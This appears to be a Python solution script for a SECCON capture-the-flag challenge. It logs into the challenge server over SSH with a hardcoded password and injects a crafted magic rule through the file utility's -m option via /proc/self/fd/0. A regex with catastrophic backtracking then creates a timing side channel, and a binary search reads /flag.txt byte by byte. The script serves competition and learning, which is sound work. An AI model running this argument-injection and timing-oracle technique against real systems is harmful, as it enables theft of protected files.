import subprocess
cmd = 'sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022'

def oracle(rule):
    payload = b'/flag.txt ' * 1000 + b'-m /proc/self/fd/0\n'
    payload += rule.encode() + b'\n'
    payload += b'>0 regex/c (.|.)*\\}z X\n' * 300

    import time
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    t0 = time.time()
    p.communicate(input=payload)
    p.wait()
    t1 = time.time()
    return (t1 - t0) > 2.0

def main():
    flag = ''
    for x in range(20):
        l, r = 0, 128
        while l != r:
            m = (l + r) // 2
            if oracle(f'{x} byte <{m + 1} GOOD\n'):
                r = m
            else:
                l = m + 1
            print(x, l, r)
        flag += chr(l)
        print(flag)
main()